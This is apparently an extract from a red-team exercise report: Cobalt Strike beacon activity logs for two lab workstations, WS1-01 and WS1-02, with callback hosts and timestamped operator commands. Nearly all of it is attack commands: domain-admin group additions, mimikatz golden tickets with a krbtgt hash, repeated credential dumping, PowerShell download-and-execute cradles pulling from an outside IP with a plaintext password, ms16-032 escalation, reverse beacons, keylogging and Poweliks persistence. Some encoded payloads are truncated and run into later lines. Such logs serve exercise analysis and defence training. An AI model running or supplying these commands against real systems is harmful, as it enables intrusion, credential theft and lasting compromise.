+Communication Path 
+
+Page. 799 
+
+hosts port protocol 
+WS1-01 445 SMB 
+61.160.128.9 80 HTTP 
+
+Activity 
+
+date activity 
+
+26/04 10:53 established link to parent beacon: WS1-01 
+26/04 10:55 run: net group "Domain Admins" kevin.mitnick /domain /add 
+26/04 10:56 host called home, sent: 60 bytes 
+26/04 10:57 list files in \\dc3\c$ 
+26/04 10:57 host called home, sent: 26 bytes 
+26/04 10:57 run: whoami /groups 
+26/04 10:58 host called home, sent: 22 bytes 
+26/04 10:59 run: net group ?domain admins? /DOMAIN 
+26/04 10:59 run: net group 'domain admins' /DOMAIN 
+26/04 10:59 host called home, sent: 94 bytes 
+26/04 11:00 run: net group 'administrators' /DOMAIN 
+26/04 11:00 host called home, sent: 42 bytes 
+26/04 11:02 run: net group 'administrators' /dc3.lab.blue07.ex 
+26/04 11:02 host called home, sent: 53 bytes 
+26/04 11:18 print working directory 
+26/04 11:18 host called home, sent: 8 bytes 
+26/04 12:09 list files in \\dc3\c$ 
+26/04 12:09 host called home, sent: 26 bytes 
+27/04 05:39 import: /root/Downloads/AggressorScripts-master/PowerUp.ps1 
+27/04 05:39 run: Invoke-AllChecks 
+27/04 05:40 import: /root/Downloads/AggressorScripts-master/powerview.ps1 
+27/04 05:40 run: Find-LocalAdminAccess 
+27/04 05:40 import: /root/Downloads/AggressorScripts-master/powerview.ps1 
+27/04 05:40 run: Invoke-UserHunter 
+27/04 05:40 import: /root/Downloads/AggressorScripts-master/powerview.ps1 
+27/04 05:40 run: Invoke-UserHunter -Stealth 
+27/04 05:40 exit 
+
+
+10.7.3.151 (WS1-01) 
+Zone: LAB 
+User: vint.cerf 
+
+Page. 800 
+
+PID: 9324 
+Opened: 26/04 11:19 
+Communication Path 
+
+hosts port protocol 
+39.71.215.32 443 HTTPS 
+
+Activity 
+
+date activity 
+
+26/04 12:07 run mimikatz's kerberos::golden /user:Admin /domain:LAB /
+sid:S-1-5-21-4154413551-3900527176-3751345652 /
+krbtgt:15ebeb266cb9425236086a61c9d27901 /endin:480 /
+renewmax:10080 /ptt command 
+
+26/04 12:07 host called home, sent: 435786 bytes 
+
+26/04 12:09 run: dir \\DC3\c$ 
+
+26/04 12:09 host called home, sent: 20 bytes 
+
+26/04 12:10 run mimikatz's kerberos::golden /user:Scoring /domain:LAB /
+sid:S-1-5-21-4154413551-3900527176-3751345652 /
+krbtgt:15ebeb266cb9425236086a61c9d27901 /endin:480 /
+renewmax:10080 /ptt command 
+
+26/04 12:10 host called home, sent: 435786 bytes 
+
+26/04 12:11 run: dir \\D10.7.3.2\C$ 
+
+26/04 12:12 host called home, sent: 26 bytes 
+
+26/04 12:13 run: dir \\DC3\c$ 
+
+26/04 12:13 host called home, sent: 20 bytes 
+
+26/04 12:23 Tasked Beacon to run windows/beacon_https/reverse_https(39.71.215.32:443) via ms16-032 
+
+26/04 12:24 host called home, sent: 135453 bytes 
+
+26/04 12:25 run: powershell Invoke-WMIMethod -Computer DC2 -ClassWin32_NetConnection -Name RunPs -ArgumentList "tasklist", $NULL 
+
+26/04 12:25 host called home, sent: 120 bytes 
+
+
+10.7.3.151 (WS1-01) 
+Zone: LAB 
+User: kevin.mitnick 
+PID: 27216 
+Opened: 27/04 06:27 
+
+Page. 801 
+
+Communication Path 
+
+hosts port protocol 
+1.93.246.97 80 HTTP 
+
+Activity 
+
+date activity 
+
+26/04 11:00 Tasked Beacon to run windows/beacon_https/reverse_https(2a07:1182:300:111:250:56ff:fe9e:3eb9:443) via ms16-032 
+
+26/04 11:01 host called home, sent: 135485 bytes 
+
+27/04 05:50 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 05:50 host called home, sent: 435794 bytes 
+
+27/04 06:20 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:20 host called home, sent: 435794 bytes 
+
+27/04 06:28 Tasked Beacon to run windows/beacon_smb/bind_pipe (127.0.0.1:80)
+via ms16-032 
+
+27/04 06:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:30 print working directory 
+
+27/04 06:30 host called home, sent: 775804 bytes 
+
+27/04 06:32 Tasked Beacon to run windows/beacon_smb/bind_pipe (127.0.0.1:80)
+in a high integrity context 
+
+27/04 06:32 host called home, sent: 338966 bytes 
+
+27/04 06:32 run: c:\windows\debug\WIA\wiatrace.txt 
+
+27/04 06:34 sleep for 10s 
+
+27/04 06:34 host called home, sent: 57 bytes 
+
+27/04 06:36 run: type c:\windows\debug\WIA\wiatrace.txt 
+
+27/04 06:36 host called home, sent: 46 bytes 
+
+27/04 06:39 Tasked Beacon to run windows/beacon_smb/bind_pipe(127.0.0.1:5001) via ms16-032 
+
+27/04 06:39 host called home, sent: 340002 bytes 
+
+27/04 06:45 run: powershell -nop -w hidden -c "$Password = ConvertTo-
+SecureString 'Niceeye15!' -AsPlainText -Force; $Credential = New-
+Object System.Management.Automation.PSCredential('kevin.mitnick',
+$Password); Invoke-Command -ComputerName DC3 -Credential$Credential -ScriptBlock { Invoke-Expression -Command ((new-objectnet.webclient).downloadstring('http://1.93.246.97:80/link')) }" 
+
+27/04 06:45 host called home, sent: 377 bytes 
+
+27/04 06:50 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:53 run: powershell -nop -w hidden -c "$Password = ConvertTo-
+SecureString 'Niceeye15!' -AsPlainText -Force; $Credential = New-
+
+Page. 802 
+
+date activity 
+
+Object System.Management.Automation.PSCredential('kevin.mitnick',
+$Password); Invoke-Command -ComputerName files -Credential$Credential -ScriptBlock { Invoke-Expression -Command ((new-objectnet.webclient).downloadstring('http://1.93.246.97:80/link')) }" 
+
+27/04 06:53 host called home, sent: 379 bytes 
+
+27/04 06:54 host called home, sent: 12 bytes 
+
+27/04 06:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:58 host called home, sent: 435794 bytes 
+
+27/04 07:04 run: powershell -nop -w hidden -c "$Password = ConvertTo-
+SecureString 'Niceeye15!' -AsPlainText -Force; $Credential = New-
+Object System.Management.Automation.PSCredential('kevin.mitnick',
+$Password); Invoke-Command -ComputerName ws1-02 -Credential$Credential -ScriptBlock { Invoke-Expression -Command ((new-objectnet.webclient).downloadstring('http://1.93.246.97:80/link')) }" 
+
+27/04 07:04 host called home, sent: 380 bytes 
+
+27/04 07:11 Tasked Beacon to run windows/beacon_smb/bind_pipe(127.0.0.1:5001) via ms16-032 
+
+27/04 07:12 host called home, sent: 340006 bytes 
+
+27/04 07:12 established link to child beacon: WS1-01 
+
+27/04 07:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 07:28 host called home, sent: 937214 bytes 
+
+27/04 07:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 07:58 host called home, sent: 871758 bytes 
+
+27/04 08:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 08:28 host called home, sent: 871758 bytes 
+
+27/04 08:45 print working directory 
+
+27/04 08:45 host called home, sent: 68 bytes 
+
+27/04 08:46 run: ping 10.7.7.3 
+
+27/04 08:46 host called home, sent: 81 bytes 
+
+27/04 08:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 08:58 host called home, sent: 871758 bytes 
+
+27/04 09:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 09:28 host called home, sent: 871758 bytes 
+
+27/04 09:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 09:58 host called home, sent: 871758 bytes 
+
+27/04 10:21 run: powershell -nop -w hidden -c "$Password = ConvertTo-
+SecureString 'Niceeye15!' -AsPlainText -Force; $Credential = New-
+Object System.Management.Automation.PSCredential('kevin.mitnick',
+$Password); Invoke-Command -ComputerName DC3 -Credential 
+
+Page. 803 
+
+date activity 
+
+$Credential -ScriptBlock { Invoke-Expression -Command ((new-objectnet.webclient).downloadstring('http://1.93.246.97:80/link')) }" 
+27/04 10:21 host called home, sent: 389 bytes 
+27/04 10:23 print working directory 
+27/04 10:23 host called home, sent: 20 bytes 
+
+27/04 10:24 run: powershell -nop -w hidden -c "$Password = ConvertTo-
+SecureString 'Niceeye15!' -AsPlainText -Force; $Credential = New-
+Object System.Management.Automation.PSCredential('kevin.mitnick',
+$Password); Invoke-Command -ComputerName FILES -Credential$Credential -ScriptBlock { Invoke-Expression -Command ((new-objectnet.webclient).downloadstring('http://1.93.246.97:80/link')) }" 
+
+27/04 10:24 host called home, sent: 391 bytes 
+27/04 10:28 Tasked Beacon to run windows/beacon_smb/bind_pipe
+
+(127.0.0.1:5001) via ms16-032 
+27/04 10:28 host called home, sent: 340014 bytes 
+27/04 10:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 10:29 list jobs 
+27/04 10:29 established link to child beacon: WS1-01 
+27/04 10:29 host called home, sent: 435814 bytes 
+27/04 10:29 kill job 2 
+27/04 10:29 kill job 20 
+27/04 10:29 host called home, sent: 32 bytes 
+27/04 10:29 kill job 21 
+27/04 10:29 host called home, sent: 22 bytes 
+27/04 10:31 list jobs 
+27/04 10:31 host called home, sent: 20 bytes 
+27/04 10:38 sleep for 10s 
+27/04 10:38 host called home, sent: 92 bytes 
+27/04 10:53 sleep for 10s 
+27/04 10:53 host called home, sent: 140 bytes 
+27/04 10:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 10:59 host called home, sent: 871886 bytes 
+27/04 11:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 11:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:20 print working directory 
+
+Page. 804 
+
+
+10.7.3.151 (WS1-01) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 24848 
+Opened: 27/04 07:13 
+
+Communication Path 
+
+hosts port protocol 
+WS1-01 445 SMB 
+1.93.246.97 80 HTTP 
+
+Activity 
+
+date activity 
+
+27/04 07:12 established link to parent beacon: WS1-01 
+
+27/04 07:12 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- net
+
+sessions & net sessions 
+
+27/04 07:12 run: type c:\Windows\Logs\resultcode.txt 
+
+27/04 07:12 host called home, sent: 202 bytes 
+
+27/04 07:14 SSH to 10.7.3.181:22 as kevin.mitnick 
+
+27/04 07:14 host called home, sent: 849467 bytes 
+
+27/04 07:14 SSH connection failed. 
+
+27/04 07:16 run net view 
+
+27/04 07:16 host called home, sent: 76344 bytes 
+
+27/04 07:17 revert token 
+
+27/04 07:17 create a token for LAB\kevin.mitnick 
+
+27/04 07:17 run windows/beacon_smb/bind_pipe (\\DC3\pipe\Winsock
+
+\ChangeListener5001#) on DC3 via WMI 
+
+27/04 07:17 host called home, sent: 210912 bytes 
+
+27/04 07:17 run: IEX ((new-object
+
+net.webclient).downloadstring('http://127.0.0.1:26991/')) 
+
+27/04 07:17 host called home, sent: 338355 bytes 
+
+27/04 07:18 host called home, sent: 12 bytes 
+
+27/04 07:18 established link to child beacon: DC3 
+
+27/04 07:24 host called home, sent: 24 bytes 
+
+27/04 07:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 07:29 host called home, sent: 435806 bytes 
+
+Page. 805 
+
+date activity 
+
+27/04 07:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 07:58 host called home, sent: 435918 bytes 
+
+27/04 08:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 08:28 host called home, sent: 435918 bytes 
+
+27/04 08:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 08:58 host called home, sent: 435918 bytes 
+
+27/04 09:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 09:28 host called home, sent: 435918 bytes 
+
+27/04 09:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 09:58 host called home, sent: 435918 bytes 
+
+27/04 10:06 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+27/04 10:06 run: type "c:\Program Files\Windows NT\checksum.txt" 
+
+27/04 10:06 host called home, sent: 226 bytes 
+
+27/04 10:25 print working directory 
+
+27/04 10:25 host called home, sent: 8 bytes 
+
+27/04 10:25 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:25 host called home, sent: 435794 bytes 
+
+27/04 10:25 host called home, sent: 12 bytes 
+
+27/04 10:26 revert token 
+
+27/04 10:26 create a token for LAB\tim.cook 
+
+27/04 10:26 run windows/beacon_smb/bind_pipe (\\WS1-03\pipe\Winsock\ChangeListener5001#) on WS1-03 via WMI 
+
+27/04 10:26 host called home, sent: 210921 bytes 
+
+27/04 10:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:29 exit 
+
+
+10.7.3.151 (WS1-01) 
+Zone: LAB 
+User: bruce.schneier 
+PID: 30588 
+Opened: 27/04 07:15 
+
+Communication Path 
+
+Page. 806 
+
+hosts port protocol 
+79.106.16.198 443 HTTPS 
+
+
+10.7.3.151 (WS1-01) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 7604 
+Opened: 27/04 10:30 
+
+Communication Path 
+
+hosts port protocol 
+WS1-01 445 SMB 
+1.93.246.97 80 HTTP 
+
+Other Indicators 
+
+date type target name 
+
+27/04 10:48 service \\dc3.lab.blue7.ex 3856469 
+
+Activity 
+
+date activity 
+
+27/04 10:29 established link to parent beacon: WS1-01 
+27/04 10:30 revert token 
+27/04 10:30 create a token for LAB.BLUE07.EX\kevin.mitnick 
+27/04 10:30 run windows/beacon_smb/bind_pipe (\\WS1-05\pipe\Winsock
+
+\ChangeListener5001#) on WS1-05 via WMI 
+27/04 10:30 host called home, sent: 210934 bytes 
+27/04 10:31 run: IEX ((new-object
+
+net.webclient).downloadstring('http://127.0.0.1:63885/')) 
+27/04 10:31 host called home, sent: 338355 bytes 
+27/04 10:32 revert token 
+27/04 10:32 create a token for LAB\tim.cook 
+27/04 10:32 run windows/beacon_smb/bind_pipe (\\WS1-03\pipe\Winsock
+
+\ChangeListener5001#) on WS1-03 via WinRM 
+27/04 10:32 host called home, sent: 208273 bytes 
+27/04 10:33 established link to child beacon: WS1-03 
+27/04 10:33 host called home, sent: 24 bytes 
+
+Page. 807 
+
+date activity 
+
+27/04 10:33 established link to child beacon: WS1-01 
+
+27/04 10:39 import: /root/Downloads/AggressorScripts-master/powerview.ps1 
+
+27/04 10:39 run: Find-LocalAdminAccess 
+
+27/04 10:40 host called home, sent: 101277 bytes 
+
+27/04 10:46 revert token 
+
+27/04 10:46 create a token for WS1-01\Administrator 
+
+27/04 10:46 run windows/beacon_smb/bind_pipe (\\dc3.lab.blue7.ex\pipe\Winsock\ChangeListener5001#) on dc3.lab.blue7.ex via WMI 
+
+27/04 10:46 host called home, sent: 211004 bytes 
+
+27/04 10:47 print working directory 
+
+27/04 10:47 host called home, sent: 32 bytes 
+
+27/04 10:48 revert token 
+
+27/04 10:48 create a token for WS1-01\Administrator 
+
+27/04 10:48 run windows/beacon_smb/bind_pipe (\\dc3.lab.blue7.ex\pipe\Winsock
+
+\ChangeListener80#) on dc3.lab.blue7.ex via Service Control Manager(PSH) 
+
+27/04 10:48 host called home, sent: 210864 bytes 
+
+27/04 10:48 revert token 
+
+27/04 10:48 create a token for WS1-01\Administrator 
+
+27/04 10:48 run windows/beacon_smb/bind_pipe (\\dc3.lab.blue7.ex\pipe\Winsock\ChangeListener80#) on dc3.lab.blue7.ex via WinRM 
+
+27/04 10:48 host called home, sent: 208340 bytes 
+
+27/04 10:49 list files in \\dc3\c$ 
+
+27/04 10:49 host called home, sent: 50 bytes 
+
+27/04 10:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 10:59 host called home, sent: 436042 bytes 
+
+27/04 11:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 11:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 12:28 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 12:58 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 13:28 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.151 (WS1-01) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 28832 
+Opened: 27/04 10:34 
+
+Page. 808 
+
+Communication Path 
+
+hosts port protocol 
+WS1-01 445 SMB 
+WS1-01 445 SMB 
+1.93.246.97 80 HTTP 
+
+Activity 
+
+date activity 
+
+27/04 10:33 established link to parent beacon: WS1-01 
+27/04 10:33 run mimikatz's sekurlsa::logonpasswords command 
+27/04 10:33 host called home, sent: 435794 bytes 
+27/04 10:33 host called home, sent: 12 bytes 
+27/04 10:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 10:59 host called home, sent: 74 bytes 
+27/04 11:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 11:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:28 run mimikatz's sekurlsa::logonpasswords command 
+27/04 12:58 run mimikatz's sekurlsa::logonpasswords command 
+27/04 13:28 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.151 (WS1-01) 
+Zone: LAB 
+User: tim.cook 
+PID: 28500 
+Opened: 27/04 11:01 
+
+Communication Path 
+
+hosts port protocol 
+1.93.124.28 443 HTTPS 
+
+Activity 
+
+date activity 
+
+27/04 11:02 Tasked Beacon to run windows/beacon_https/reverse_https(1.93.124.28:443) via ms16-032 
+
+Page. 809 
+
+date activity 
+
+27/04 11:02 host called home, sent: 135453 bytes 
+
+
+10.7.3.152 (WS1-02) 
+Zone: LAB 
+User: steve.ballmer 
+PID: 1424 
+Opened: 26/04 07:37 
+
+Communication Path 
+
+hosts port protocol 
+39.71.215.32 443 HTTPS 
+
+Activity 
+
+date activity 
+
+26/04 07:37 spawn (x86) windows/beacon_http/reverse_http (39.82.133.147:443) 
+26/04 07:37 spawn (x86) windows/beacon_https/reverse_https
+
+(2a07:1182:300:111:250:56ff:fe9e:3eb9:443) 
+26/04 07:38 spawn (x86) windows/beacon_dns/reverse_http (39.91.173.101:80) 
+26/04 07:38 host called home, sent: 1657 bytes 
+26/04 07:38 Tasked Beacon to run windows/beacon_https/reverse_https
+
+(39.71.215.32:443) via ms16-032 
+26/04 07:38 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- net
+
+sessions & net sessions 
+26/04 07:38 run: type c:\Users\Public\Documents\doc.txt 
+26/04 07:39 host called home, sent: 135658 bytes 
+
+
+10.7.3.152 (WS1-02) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 1868 
+Opened: 26/04 07:39 
+
+Communication Path 
+
+Page. 810 
+
+hosts port protocol 
+39.71.215.32 443 HTTPS 
+
+Activity 
+
+date activity 
+
+26/04 07:39 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 07:39 run: type c:\Users\Public\Documents\doc.txt 
+26/04 07:40 spawn (x86) windows/beacon_https/reverse_https
+
+(2a07:1182:300:111:250:56ff:fe9e:3eb9:443) 
+26/04 07:40 spawn (x86) windows/beacon_http/reverse_http (39.82.133.147:443) 
+26/04 07:40 spawn (x86) windows/beacon_dns/reverse_http (39.91.173.101:80) 
+26/04 07:40 run mimikatz's sekurlsa::logonpasswords command 
+26/04 07:40 host called home, sent: 437656 bytes 
+26/04 07:40 dump hashes 
+26/04 07:41 host called home, sent: 64069 bytes 
+26/04 07:41 received password hashes 
+26/04 07:41 run: Persist-Poweliks -cobaltstrike_gen_payload
+
+"JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEATwA4AFAAMQBVAHIAdgBkAFMAZQBqAG4AaQBEAFMAOQBwADIASgAxAFgAaQBiAEkAdAB0ADcAUgB5AE0ASwBmAHcAbABhAFYAVgB4AEoAWgBKAG0ANQBPAE4AMwBQAH26/04 07:42 host called home, sent: 6285 bytes 
+26/04 07:42 import: /root/tools/Aggressor-scripts/kits/PersistKit/scripts/Persist
+
+
+Poweliks.ps1 
+26/04 07:42 run: Persist-Poweliks 
+26/04 07:43 host called home, sent: 1764 bytes 
+26/04 08:02 run: Persist-Poweliks -cobaltstrike_gen_payload
+
+"JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAbgBlAE4ANgBxAGQAMwB1AHgAUABRAEwAUgBKAHIAdQBVADcARwA2AEsAQgBOAGsAOQBkADcAUgBzAEkAZQAvAEIASwAwAHEAcgA4AFMAeQBUAE4AeQBjAGIAUgBmAG26/04 08:02 host called home, sent: 6293 bytes 
+26/04 08:03 run: Test-Poweliks 
+26/04 08:03 host called home, sent: 21 bytes 
+26/04 08:23 spawn (x86) windows/beacon_http/reverse_http (39.82.133.147:443) 
+26/04 08:23 spawn (x86) windows/beacon_https/reverse_https
+
+(2a07:1182:300:111:250:56ff:fe9e:3eb9:443) 
+26/04 08:23 spawn (x86) windows/beacon_dns/reverse_http (39.91.173.101:80) 
+26/04 08:24 host called home, sent: 1657 bytes 
+
+
+10.7.3.152 (WS1-02) 
+Zone: LAB 
+
+Page. 811 
+
+User: steve.ballmer 
+PID: 5608 
+Opened: 26/04 07:41 
+
+Communication Path 
+
+hosts port protocol 
+www.nordichotel.ex, www.swissotel.ex, www.radissonblu.ex,443 HTTP 
+www.hotel.comex 
+
+Activity 
+
+date activity 
+
+26/04 07:38 list processes 
+
+26/04 07:38 host called home, sent: 24 bytes 
+
+26/04 07:38 steal token from PID 2524 
+
+26/04 07:38 log keystrokes in 2524 (x64) 
+
+26/04 07:38 host called home, sent: 82006 bytes 
+
+26/04 07:53 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 07:53 run: type c:\Users\Public\Documents\doc.txt 
+
+26/04 07:53 host called home, sent: 205 bytes 
+
+27/04 05:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:41 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.152 (WS1-02) 
+Zone: LAB 
+User: steve.ballmer 
+PID: 4416 
+Opened: 26/04 07:42 
+
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+Page. 812 
+
+Activity 
+
+date activity 
+
+26/04 07:38 list processes 
+26/04 07:48 host called home, sent: 24 bytes 
+26/04 07:48 steal token from PID 2524 
+26/04 07:48 log keystrokes in 2524 (x64) 
+26/04 07:56 host called home, sent: 82006 bytes 
+
+
+10.7.3.152 (WS1-02) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 4892 
+Opened: 26/04 07:44 
+
+Communication Path 
+
+hosts port protocol 
+www.nordichotel.ex, www.swissotel.ex, www.radissonblu.ex,443 HTTP 
+www.hotel.comex 
+
+Activity 
+
+date activity 
+
+26/04 07:40 host called home, sent: 12 bytes 
+
+26/04 07:40 steal token from PID 2524 
+
+26/04 07:40 log keystrokes in 2524 (x64) 
+
+26/04 07:40 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 07:40 run: type c:\Users\Public\Documents\doc.txt 
+
+26/04 07:40 host called home, sent: 82211 bytes 
+
+26/04 07:41 spawn (x86) windows/beacon_dns/reverse_http (39.91.173.101:80) 
+
+26/04 07:41 host called home, sent: 535 bytes 
+
+26/04 10:03 spawn (x86) windows/beacon_http/reverse_http (uljastest.ex:80) 
+
+26/04 10:04 host called home, sent: 534 bytes 
+
+26/04 10:04 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+
+26/04 10:04 run: type c:\Users\Public\Documents\doc.txt 
+
+Page. 813 
+
+date activity 
+
+26/04 10:04 host called home, sent: 205 bytes 
+
+26/04 10:05 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- net
+
+sessions & net sessions 
+
+26/04 10:05 run: type "c:\Program Files\Common Files\smgs-res.log" 
+
+26/04 10:05 host called home, sent: 216 bytes 
+
+26/04 10:05 spawn (x86) windows/beacon_http/reverse_http (uljastest.ex:80) 
+
+26/04 10:06 host called home, sent: 534 bytes 
+
+27/04 05:41 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:11 run mimikatz's sekurlsa::logonpasswords command 
+
+27/04 06:41 run mimikatz's sekurlsa::logonpasswords command 
+
+
+10.7.3.152 (WS1-02) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 1272 
+Opened: 26/04 07:44 
+
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+Activity 
+
+date activity 
+
+26/04 07:40 list processes 
+26/04 07:50 host called home, sent: 24 bytes 
+26/04 07:50 steal token from PID 2524 
+26/04 07:50 log keystrokes in 2524 (x64) 
+26/04 07:59 host called home, sent: 82006 bytes 
+
+
+10.7.3.152 (WS1-02) 
+Zone: LAB 
+User: kevin.mitnick 
+PID: 2816 
+
+Page. 814 
+
+Opened: 26/04 08:43 
+Communication Path 
+Opened: 26/04 08:43 
+Communication Path 
+
+hosts port protocol 
+39.71.215.32 443 HTTPS 
+
+Activity 
+
+date activity 
+
+26/04 08:59 spawn (x86) windows/beacon_http/reverse_http (39.82.133.147:443) 
+26/04 09:00 spawn (x86) windows/beacon_https/reverse_https
+
+(2a07:1182:300:111:250:56ff:fe9e:3eb9:443) 
+26/04 09:00 spawn (x86) windows/beacon_dns/reverse_http (39.91.173.101:80) 
+26/04 09:00 host called home, sent: 1657 bytes 
+26/04 09:00 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+26/04 09:00 run: type c:\Users\Public\Documents\doc.txt 
+26/04 09:00 Tasked Beacon to run windows/beacon_https/reverse_https(39.71.215.32:443) via ms16-032 
+26/04 09:01 host called home, sent: 135658 bytes 
+
+
+10.7.3.152 (WS1-02) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 8052 
+Opened: 26/04 09:01 
+
+Communication Path 
+
+hosts port protocol 
+39.71.215.32 443 HTTPS 
+
+Activity 
+
+date activity 
+26/04 09:02 run: ipconfig | find "Address" & echo -- & date /T & time /T & echo --
+whoami & whoami /USER /FO CSV & echo -- at & at & echo -- netsessions & net sessions 
+26/04 09:02 run: type c:\Users\Public\Documents\doc.txt 
+
+Page. 815 
+
+date activity 
+
+26/04 09:02 host called home, sent: 205 bytes 
+26/04 09:02 import: /root/tools/Aggressor-scripts/kits/PersistKit/scripts/PersistPoweliks.
+ps1 
+26/04 09:03 run: Persist-Poweliks -cobaltstrike_gen_payload
+
+"JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEANAAzAHEAcAAzAGUANwBFADkAQQB0AEUAbQB1ADUAagBzAGIAbwBvAEUAMgBUADEAMwB0AEMAdwBoAHoAOABGAHIAUwBxAHYAeABMAEoATQAzAEoAeAB0AEYAKwBCAE26/04 09:03 host called home, sent: 8025 bytes 
+26/04 09:03 run mimikatz's sekurlsa::logonpasswords command 
+26/04 09:03 dump hashes 
+26/04 09:04 host called home, sent: 499863 bytes 
+26/04 09:04 received password hashes 
+
+
+10.7.3.152 (WS1-02) 
+Zone: LAB 
+User: SYSTEM * 
+PID: 3776 
+Opened: 26/04 09:06 
+
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+Activity 
+
+date activity 
+
+26/04 09:02 list processes 
+
+26/04 09:06 spawn (x86) windows/beacon_dns/reverse_dns_txt (tripadvisor.ex viaDNS TXT) 
+
+26/04 09:11 host called home, sent: 541 bytes 
+
+26/04 09:11 steal token from PID 2524 
+
+26/04 09:11 log keystrokes in 2524 (x64) 
+
+26/04 09:11 steal token from PID 3360 
+
+26/04 09:11 log keystrokes in 3360 (x64) 
+
+26/04 09:59 host called home, sent: 164012 bytes 
+
+Page. 816 
+
+
+10.7.3.152 (WS1-02) 
+Zone: LAB 
+User: Administrator * 
+PID: 8348 
+Opened: 26/04 09:39 
+
+Communication Path 
+
+hosts port protocol 
+39.71.215.32 443 HTTPS 
+
+
+10.7.3.152 (WS1-02) 
+Zone: LAB 
+User: kevin.mitnick 
+PID: 8012 
+Opened: 26/04 09:40 
+
+Communication Path 
+
+hosts port protocol 
+www.bong.com, www.bing.com.ex,443 HTTPS 
+bing.bing.com, www.bling.ex, 222.186.31.150,2a07:1182:b00b:babe:250:56ff:fe9e:3eb9 
+
+Activity 
+
+date activity 
+
+26/04 09:36 list processes 
+26/04 09:45 host called home, sent: 24 bytes 
+26/04 09:45 steal token from PID 2524 
+26/04 09:45 log keystrokes in 2524 (x64) 
+26/04 09:45 steal token from PID 3360 
